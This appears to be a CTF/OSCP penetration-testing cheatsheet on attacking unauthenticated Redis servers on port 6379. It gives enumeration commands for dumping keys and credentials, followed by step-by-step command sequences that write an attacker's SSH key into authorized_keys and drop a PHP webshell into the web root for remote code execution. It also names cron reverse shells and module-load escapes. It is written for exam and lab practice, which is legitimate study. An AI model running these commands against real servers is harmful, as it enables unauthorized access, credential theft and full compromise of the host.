---
tags: [hacking, ctf, oscp, redis, database]
type: cheatsheet
source: compiled reference (Redis enumeration)
last-verified: 2026-09-02
---

# Redis (6379)

## Up
- [[Services]]

Redis is an in-memory key-value store that is frequently **unauthenticated**. Wins: read data for creds, and abuse write access to drop an **SSH key**, a **webshell**, or a **cron job** → RCE.

---

## Enumerate

```bash
nmap -p6379 -sC -sV $IP
redis-cli -h $IP                        # connect (often no auth)
redis-cli -h $IP INFO                    # version, os, role, config
redis-cli -h $IP CONFIG GET '*'          # dir, dbfilename, requirepass?
redis-cli -h $IP KEYS '*'                # dump keys → GET each (creds/tokens)
```

---

## Foothold Techniques (unauth write → RCE)

```bash
# 1) SSH key write (if redis runs as a user with a writable ~/.ssh)
ssh-keygen -f ./k -N ""
(echo -e "\n\n"; cat k.pub; echo -e "\n\n") > pub.txt
redis-cli -h $IP flushall
cat pub.txt | redis-cli -h $IP -x set pwn
redis-cli -h $IP config set dir /home/redis/.ssh    # or /root/.ssh
redis-cli -h $IP config set dbfilename authorized_keys
redis-cli -h $IP save
ssh -i k redis@$IP                                   # → shell

# 2) webshell write (if a web root is writable)
redis-cli -h $IP config set dir /var/www/html
redis-cli -h $IP config set dbfilename shell.php
redis-cli -h $IP set x '<?php system($_GET["c"]); ?>'
redis-cli -h $IP save                                # browse /shell.php

# 3) cron write (Linux) → reverse shell on a schedule (/var/spool/cron/crontabs)
# 4) modern Redis: RCE via loadmodule / Lua sandbox escapes (version-dependent)
```

---

## Common Misconfigurations / Exploits

- **No authentication** (`requirepass` unset) + bound to all interfaces → full access.
- **Writable `dir`/`dbfilename`** → write SSH keys / webshells / cron → RCE.
- Sensitive **data/creds** stored in keys → reuse.
- Old versions: **Lua sandbox escape** / `MODULE LOAD` RCE.

---

## OSCP Tips

- First: `redis-cli -h $IP` then `INFO` — check the **`role`**, **`dir`**, and whether auth is required.
- The **SSH-key-write** trick is the classic Redis foothold; pick a `dir` you can actually write (`.ssh` of the redis/other user).
- `KEYS *` + `GET` may hand you creds directly — reuse everywhere ([[Password Cracking]]).
